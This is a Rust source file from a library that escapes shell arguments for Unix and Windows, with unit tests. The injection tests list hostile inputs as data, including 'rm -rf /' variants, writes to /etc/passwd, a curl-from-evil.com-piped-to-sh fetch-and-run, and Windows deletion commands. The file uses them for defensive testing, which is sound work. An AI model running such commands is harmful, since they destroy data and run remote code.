//! Shell argument sanitization
//!
//! Platform-aware escaping for command-line arguments.
//! Ensures arguments are safely passed to shell commands.
//!
//! ## Platform Strategies
//!
//! - **Unix**: Wraps in single quotes, escapes internal single quotes
//! - **Windows**: Wraps in double quotes, escapes internal quotes and backslashes
//!
//! ## Design Philosophy
//!
//! Shell escaping is the **last line of defense** when you must pass
//! untrusted input to a shell. Prefer using `std::process::Command`
//! with direct argument passing (which bypasses the shell entirely)
//! whenever possible.

use crate::primitives::types::Problem;

/// Result type for sanitization operations
pub type SanitizationResult = Result<String, Problem>;

// ============================================================================
// Platform-Aware Escaping
// ============================================================================

/// Escape a shell argument for the current platform
///
/// Automatically detects the platform and applies appropriate escaping.
/// On Unix, uses single-quote wrapping. On Windows, uses double-quote wrapping.
///
/// # Example
///
/// ```ignore
/// use octarine::security::commands::sanitization;
///
/// let safe = sanitization::escape_shell_arg("user's input").expect("valid");
/// // On Unix: 'user'\''s input'
/// // On Windows: "user's input"
/// ```
pub fn escape_shell_arg(arg: &str) -> SanitizationResult {
    validate_escapable(arg)?;

    #[cfg(unix)]
    {
        Ok(escape_shell_arg_unix(arg))
    }
    #[cfg(windows)]
    {
        Ok(escape_shell_arg_windows(arg))
    }
    #[cfg(not(any(unix, windows)))]
    {
        // Fallback to Unix-style escaping for unknown platforms
        Ok(escape_shell_arg_unix(arg))
    }
}

/// Escape a shell argument using Unix conventions (single quotes)
///
/// Wraps the argument in single quotes and escapes any internal single quotes
/// using the `'\''` pattern (end quote, escaped quote, start quote).
///
/// # Example
///
/// ```ignore
/// use octarine::security::commands::sanitization::escape_shell_arg_unix;
///
/// assert_eq!(escape_shell_arg_unix("simple"), "'simple'");
/// assert_eq!(escape_shell_arg_unix("user's input"), "'user'\\''s input'");
/// assert_eq!(escape_shell_arg_unix("$(whoami)"), "'$(whoami)'");
/// ```
#[must_use]
pub fn escape_shell_arg_unix(arg: &str) -> String {
    // In single quotes, only single quotes need escaping
    // Pattern: end current quote, add escaped quote, start new quote
    let escaped = arg.replace('\'', "'\\''");
    format!("'{}'", escaped)
}

/// Escape a shell argument using Windows conventions (double quotes)
///
/// Wraps the argument in double quotes and escapes internal double quotes
/// and backslashes according to Windows cmd.exe rules.
///
/// # Windows Escaping Rules
///
/// - Double quotes are escaped as `\"`
/// - Backslashes before double quotes are doubled
/// - Trailing backslashes are doubled (to prevent escaping the closing quote)
///
/// # Example
///
/// ```ignore
/// use octarine::security::commands::sanitization::escape_shell_arg_windows;
///
/// assert_eq!(escape_shell_arg_windows("simple"), "\"simple\"");
/// assert_eq!(escape_shell_arg_windows("with \"quotes\""), "\"with \\\"quotes\\\"\"");
/// assert_eq!(escape_shell_arg_windows("path\\to\\"), "\"path\\to\\\\\"");
/// ```
#[must_use]
pub fn escape_shell_arg_windows(arg: &str) -> String {
    let mut result = String::with_capacity(arg.len().saturating_mul(2).saturating_add(2));

    let chars: Vec<char> = arg.chars().collect();
    let len = chars.len();

    for (i, c) in chars.iter().enumerate() {
        match c {
            '"' => {
                // Escape double quotes
                result.push('\\');
                result.push('"');
            }
            '\\' => {
                // Check what follows this backslash
                let next_idx = i.saturating_add(1);
                let next_char = chars.get(next_idx);

                // Double backslash if followed by quote or at end
                // (trailing backslashes would escape the closing quote)
                let is_trailing = next_idx == len;
                let followed_by_quote = next_char == Some(&'"');

                if followed_by_quote || is_trailing {
                    // Double the backslash
                    result.push('\\');
                    result.push('\\');
                } else {
                    result.push('\\');
                }
            }
            _ => result.push(*c),
        }
    }

    format!("\"{}\"", result)
}

// ============================================================================
// Validation for Escapable Input
// ============================================================================

/// Validate that input can be safely escaped
///
/// Some inputs cannot be safely escaped and should be rejected:
/// - Null bytes (would truncate the argument)
/// - Control characters that could affect terminal behavior
fn validate_escapable(arg: &str) -> Result<(), Problem> {
    // Null bytes are never safe
    if arg.contains('\0') {
        return Err(Problem::validation(
            "Argument contains null bytes - cannot safely escape",
        ));
    }

    // Dangerous control characters (not tab, newline, carriage return)
    for c in arg.chars() {
        let code = c as u32;
        if code < 32 && code != 9 && code != 10 && code != 13 {
            return Err(Problem::validation(format!(
                "Argument contains dangerous control character (0x{:02X}) - cannot safely escape",
                code
            )));
        }
    }

    Ok(())
}

// ============================================================================
// Bulk Escaping
// ============================================================================

/// Escape multiple shell arguments
///
/// Returns a vector of escaped arguments, or an error if any argument
/// cannot be safely escaped.
///
/// # Example
///
/// ```ignore
/// use octarine::security::commands::sanitization::escape_shell_args;
///
/// let args = vec!["--flag", "user's input", "file.txt"];
/// let escaped = escape_shell_args(&args).expect("valid");
/// ```
pub fn escape_shell_args<I, S>(args: I) -> Result<Vec<String>, Problem>
where
    I: IntoIterator<Item = S>,
    S: AsRef<str>,
{
    args.into_iter()
        .enumerate()
        .map(|(i, arg)| {
            escape_shell_arg(arg.as_ref()).map_err(|e| {
                Problem::validation(format!("Argument {} cannot be escaped: {}", i, e))
            })
        })
        .collect()
}

/// Join escaped arguments into a command string
///
/// Escapes each argument and joins them with spaces.
/// Useful when you need to build a shell command string.
///
/// # Example
///
/// ```ignore
/// use octarine::security::commands::sanitization::join_shell_args;
///
/// let cmd = join_shell_args(&["echo", "Hello, World!"]).expect("valid");
/// // On Unix: 'echo' 'Hello, World!'
/// ```
pub fn join_shell_args<I, S>(args: I) -> SanitizationResult
where
    I: IntoIterator<Item = S>,
    S: AsRef<str>,
{
    let escaped = escape_shell_args(args)?;
    Ok(escaped.join(" "))
}

// ============================================================================
// Environment Variable Escaping
// ============================================================================

/// Escape an environment variable value for shell
///
/// Some shells expand environment variables in certain contexts.
/// This escapes the value to prevent expansion.
pub fn escape_env_value(value: &str) -> SanitizationResult {
    // Environment values use the same escaping as arguments
    escape_shell_arg(value)
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    #![allow(clippy::panic, clippy::expect_used, clippy::unwrap_used)]
    use super::*;

    // ------------------------------------------------------------------------
    // Unix Escaping Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_escape_unix_simple() {
        assert_eq!(escape_shell_arg_unix("simple"), "'simple'");
        assert_eq!(escape_shell_arg_unix("with space"), "'with space'");
        assert_eq!(escape_shell_arg_unix("flag=value"), "'flag=value'");
    }

    #[test]
    fn test_escape_unix_single_quote() {
        assert_eq!(escape_shell_arg_unix("user's"), "'user'\\''s'");
        assert_eq!(escape_shell_arg_unix("it's a test"), "'it'\\''s a test'");
        assert_eq!(escape_shell_arg_unix("'''"), "''\\'''\\'''\\'''");
    }

    #[test]
    fn test_escape_unix_special_chars() {
        // All these should be safely wrapped in single quotes
        assert_eq!(escape_shell_arg_unix("$(whoami)"), "'$(whoami)'");
        assert_eq!(escape_shell_arg_unix("`ls`"), "'`ls`'");
        assert_eq!(escape_shell_arg_unix("$HOME"), "'$HOME'");
        assert_eq!(escape_shell_arg_unix("${PATH}"), "'${PATH}'");
        assert_eq!(escape_shell_arg_unix("; rm -rf /"), "'; rm -rf /'");
        assert_eq!(escape_shell_arg_unix("| cat"), "'| cat'");
        assert_eq!(escape_shell_arg_unix("&& echo"), "'&& echo'");
        assert_eq!(escape_shell_arg_unix("> /etc/passwd"), "'> /etc/passwd'");
    }

    #[test]
    fn test_escape_unix_double_quotes() {
        // Double quotes don't need escaping in single-quoted strings
        assert_eq!(escape_shell_arg_unix("\"quoted\""), "'\"quoted\"'");
    }

    #[test]
    fn test_escape_unix_empty() {
        assert_eq!(escape_shell_arg_unix(""), "''");
    }

    #[test]
    fn test_escape_unix_newlines() {
        assert_eq!(escape_shell_arg_unix("line1\nline2"), "'line1\nline2'");
    }

    // ------------------------------------------------------------------------
    // Windows Escaping Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_escape_windows_simple() {
        assert_eq!(escape_shell_arg_windows("simple"), "\"simple\"");
        assert_eq!(escape_shell_arg_windows("with space"), "\"with space\"");
    }

    #[test]
    fn test_escape_windows_double_quote() {
        assert_eq!(
            escape_shell_arg_windows("with \"quotes\""),
            "\"with \\\"quotes\\\"\""
        );
        assert_eq!(escape_shell_arg_windows("\""), "\"\\\"\"");
    }

    #[test]
    fn test_escape_windows_backslash() {
        // Regular backslash (not followed by quote) - single backslash
        assert_eq!(
            escape_shell_arg_windows("path\\to\\file"),
            "\"path\\to\\file\""
        );

        // Trailing backslash - doubled
        assert_eq!(escape_shell_arg_windows("path\\"), "\"path\\\\\"");

        // Backslash before quote - doubled
        assert_eq!(
            escape_shell_arg_windows("path\\\"quote"),
            "\"path\\\\\\\"quote\""
        );
    }

    #[test]
    fn test_escape_windows_empty() {
        assert_eq!(escape_shell_arg_windows(""), "\"\"");
    }

    #[test]
    fn test_escape_windows_single_quote() {
        // Single quotes don't need escaping in double-quoted strings on Windows
        assert_eq!(escape_shell_arg_windows("user's"), "\"user's\"");
    }

    #[test]
    fn test_escape_shell_arg_windows_percent_expansion() {
        // cmd.exe expands %VAR% even inside double quotes; the current
        // implementation passes percent characters through unchanged.
        // Locks in current behavior so any future change to percent
        // handling is caught on Linux CI.
        assert_eq!(escape_shell_arg_windows("%PATH%"), "\"%PATH%\"");
        assert_eq!(escape_shell_arg_windows("%USERNAME%"), "\"%USERNAME%\"");
        assert_eq!(escape_shell_arg_windows("a%VAR%b"), "\"a%VAR%b\"");
        assert_eq!(escape_shell_arg_windows("%"), "\"%\"");
    }

    #[test]
    fn test_escape_shell_arg_windows_caret_escape() {
        // ^ is the cmd.exe escape character; inside double quotes cmd.exe
        // does not interpret it, so the current implementation passes it
        // through unchanged. Locks in current behavior.
        assert_eq!(escape_shell_arg_windows("^"), "\"^\"");
        assert_eq!(escape_shell_arg_windows("a^b"), "\"a^b\"");
        assert_eq!(escape_shell_arg_windows("^^"), "\"^^\"");
        assert_eq!(escape_shell_arg_windows("^&calc"), "\"^&calc\"");
    }

    // ------------------------------------------------------------------------
    // Platform-Aware Escaping Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_escape_shell_arg_valid() {
        assert!(escape_shell_arg("normal argument").is_ok());
        assert!(escape_shell_arg("with\ttab").is_ok());
        assert!(escape_shell_arg("with\nnewline").is_ok());
    }

    #[test]
    fn test_escape_shell_arg_null_byte() {
        let result = escape_shell_arg("file\0.txt");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(format!("{}", err).contains("null bytes"));
    }

    #[test]
    fn test_escape_shell_arg_control_char() {
        let result = escape_shell_arg("file\x01.txt"); // SOH
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(format!("{}", err).contains("control character"));
    }

    // ------------------------------------------------------------------------
    // Bulk Escaping Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_escape_shell_args_valid() {
        let args = vec!["--flag", "value", "file.txt"];
        let result = escape_shell_args(&args);
        assert!(result.is_ok());

        let escaped = result.expect("valid");
        assert_eq!(escaped.len(), 3);
    }

    #[test]
    fn test_escape_shell_args_with_invalid() {
        let args = vec!["valid", "file\0.txt", "another"];
        let result = escape_shell_args(&args);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(format!("{}", err).contains("Argument 1"));
    }

    #[test]
    fn test_join_shell_args() {
        let result = join_shell_args(["echo", "hello"]);
        assert!(result.is_ok());

        let joined = result.expect("valid");
        // Should have space between escaped args
        assert!(joined.contains(' '));
    }

    // ------------------------------------------------------------------------
    // Environment Value Escaping Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_escape_env_value() {
        assert!(escape_env_value("/usr/local/bin").is_ok());
        assert!(escape_env_value("value with spaces").is_ok());
        assert!(escape_env_value("$(whoami)").is_ok()); // Escaped, not executed
    }

    #[test]
    fn test_escape_env_value_null() {
        let result = escape_env_value("value\0null");
        assert!(result.is_err());
    }

    // ------------------------------------------------------------------------
    // Security Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_escape_prevents_injection_unix() {
        // These should all be safely wrapped, not executed
        let dangerous = [
            "$(rm -rf /)",
            "`rm -rf /`",
            "; rm -rf /",
            "| rm -rf /",
            "&& rm -rf /",
            "|| rm -rf /",
            "> /etc/passwd",
            "< /etc/passwd",
            "$IFS",
            "${IFS}",
            "$(curl evil.com|sh)",
        ];

        for input in dangerous {
            let escaped = escape_shell_arg_unix(input);
            // All should be wrapped in single quotes
            assert!(
                escaped.starts_with('\''),
                "Should start with quote: {}",
                input
            );
            assert!(escaped.ends_with('\''), "Should end with quote: {}", input);
        }
    }

    #[test]
    fn test_escape_prevents_injection_windows() {
        let dangerous = [
            "& del /F /Q *",
            "| type password.txt",
            "> virus.exe",
            "\" && evil.exe",
        ];

        for input in dangerous {
            let escaped = escape_shell_arg_windows(input);
            // All should be wrapped in double quotes
            assert!(
                escaped.starts_with('"'),
                "Should start with quote: {}",
                input
            );
            assert!(escaped.ends_with('"'), "Should end with quote: {}", input);
        }
    }

    // ------------------------------------------------------------------------
    // Edge Cases
    // ------------------------------------------------------------------------

    #[test]
    fn test_escape_unicode() {
        assert_eq!(escape_shell_arg_unix("日本語"), "'日本語'");
        assert_eq!(escape_shell_arg_unix("émoji: 🎉"), "'émoji: 🎉'");
        assert_eq!(escape_shell_arg_windows("日本語"), "\"日本語\"");
    }

    #[test]
    fn test_escape_long_string() {
        let long = "a".repeat(10000);
        let escaped = escape_shell_arg_unix(&long);
        assert_eq!(escaped.len(), 10002); // Original + 2 quotes
    }

    #[test]
    fn test_escape_mixed_quotes() {
        // Both single and double quotes
        let input = "it's \"complex\"";
        let escaped = escape_shell_arg_unix(input);
        assert_eq!(escaped, "'it'\\''s \"complex\"'");
    }

    #[test]
    fn test_validate_escapable_tabs_allowed() {
        assert!(validate_escapable("with\ttab").is_ok());
    }

    #[test]
    fn test_validate_escapable_newlines_allowed() {
        assert!(validate_escapable("with\nnewline").is_ok());
        assert!(validate_escapable("with\r\nwindows").is_ok());
    }

    #[test]
    fn test_validate_escapable_bell_rejected() {
        // Bell character (0x07)
        assert!(validate_escapable("bell\x07char").is_err());
    }

    #[test]
    fn test_validate_escapable_escape_rejected() {
        // Escape character (0x1B)
        assert!(validate_escapable("\x1B[31m").is_err());
    }
}
